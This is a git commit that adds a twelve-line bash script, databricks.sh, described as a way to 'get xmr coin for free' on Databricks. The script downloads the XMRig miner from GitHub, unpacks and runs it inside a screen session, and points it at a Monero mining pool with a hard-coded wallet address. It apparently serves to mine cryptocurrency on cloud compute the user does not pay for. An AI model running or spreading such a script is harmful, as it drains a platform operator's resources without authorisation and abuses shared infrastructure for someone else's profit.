f2697c76e5b4235c74edae0bab6b1be14b6277d4
flsylayer1 <102252753+flsylayer1@users.noreply.github.com>
2022-03-28 04:40:25 +0700

    Create databricks.sh

---
+++ databricks.sh
@@ -0,0 +1,12 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+sudo apt update
+clear
+sudo apt install screen
+screen -R xmr
+ 
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
+tar xvzf xmrig-6.16.4-focal-x64.tar.gz
+cd xmrig-6.16.4
+./xmrig -o us-west.minexmr.com:443 -u 84ocKmSGmtN9oi3EzFoot85ZzpFEBsvJYhEkquCoXAL17sTxQLxF2yq6kYaftyq8coFt4UpZAxnAhRQhtsQJjPWuH1d2yAi -k --tls --rig-id Aby
